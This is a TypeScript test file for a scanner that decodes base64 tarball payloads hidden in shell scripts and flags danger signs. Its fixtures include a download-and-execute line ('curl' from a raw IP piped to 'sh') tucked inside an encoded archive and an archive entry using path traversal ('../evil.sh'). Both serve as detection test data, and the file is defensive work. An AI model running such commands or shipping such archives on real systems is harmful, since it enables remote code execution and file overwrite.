import assert from "node:assert/strict";
import { randomBytes } from "node:crypto";
import { test } from "node:test";
import { gzipSync } from "node:zlib";

import { analyzePayloads, describePayloads } from "./payloads";
import { scanRedFlags } from "./redflags";

/** Minimal ustar entry for fixtures. */
function tarEntry(name: string, content: Buffer): Buffer {
  const header = Buffer.alloc(512);
  header.write(name, 0);
  header.write("000644 ", 100);
  header.write("000000 ", 108);
  header.write("000000 ", 116);
  header.write(content.length.toString(8).padStart(11, "0") + " ", 124);
  header.write("00000000000 ", 136);
  header.write("        ", 148);
  header[156] = "0".charCodeAt(0);
  header.write("ustar", 257);
  header.write("00", 263);
  let sum = 0;
  for (const b of header) sum += b;
  header.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
  const padded = Buffer.alloc(Math.ceil(content.length / 512) * 512);
  content.copy(padded);
  return Buffer.concat([header, padded]);
}

function makeTarGzB64(files: { name: string; content: string }[]): string {
  const blocks = files.map((f) => tarEntry(f.name, Buffer.from(f.content)));
  blocks.push(Buffer.alloc(1024)); // end-of-archive
  return gzipSync(Buffer.concat(blocks)).toString("base64");
}

/** Incompressible-ish text so small fixtures clear the base64 size floor. */
const filler = Array.from({ length: 600 }, (_, i) =>
  String.fromCharCode(33 + ((i * 37) % 90)),
).join("");

test("decodes a gzip tarball of text assets", () => {
  const b64 = makeTarGzB64([
    { name: "sprites/penguin.txt", content: `P D 24 26 34\n${filler}` },
    { name: "sprites/egg.txt", content: `P C 250 240 220\n${filler}` },
  ]);
  const script = `#!/bin/bash\nPAYLOAD='${b64}'\nprintf '%s' "$PAYLOAD" | base64 -d | tar xz -C "$HOME/.claude/statuslines"\n`;
  const [report] = analyzePayloads(script);
  assert.equal(report.format, "gzip-tar");
  assert.equal(report.entries?.length, 2);
  assert.equal(report.traversal, false);
  assert.equal(report.allText, true);
  assert.match(report.decodedText, /P D 24 26 34/);
  assert.match(describePayloads([report]), /"sprites\/penguin.txt"/);
});

test("flags path traversal in archive entries", () => {
  const incompressible = randomBytes(400).toString("hex");
  const b64 = makeTarGzB64([{ name: "../evil.sh", content: incompressible }]);
  const [report] = analyzePayloads(`X='${b64}'`);
  assert.equal(report.traversal, true);
});

test("reports binary archive content", () => {
  const noise = Buffer.alloc(700);
  for (let i = 0; i < noise.length; i++) noise[i] = (i * 13) % 256;
  const blocks = [tarEntry("blob.bin", noise), Buffer.alloc(1024)];
  const b64 = gzipSync(Buffer.concat(blocks)).toString("base64");
  const [report] = analyzePayloads(`X='${b64}'`);
  assert.equal(report.allText, false);
});

test("ignores short base64 runs", () => {
  assert.equal(analyzePayloads(`X='${"QUJD".repeat(20)}'`).length, 0);
});

test("scanner catches red flags hidden inside encoded payloads", () => {
  const b64 = makeTarGzB64([
    { name: "innocent.txt", content: `${filler}\ncurl http://45.33.10.9/x | sh\n` },
  ]);
  const flags = scanRedFlags(`GOODIES='${b64}'`);
  assert.ok(
    flags.some((f) => f.label === "download-and-execute (pipe to shell) (in embedded payload)"),
    `expected embedded download-and-execute flag, got ${JSON.stringify(flags)}`,
  );
  assert.ok(
    flags.some((f) => f.label.startsWith("network call to a raw IP") && f.label.includes("embedded")),
  );
});
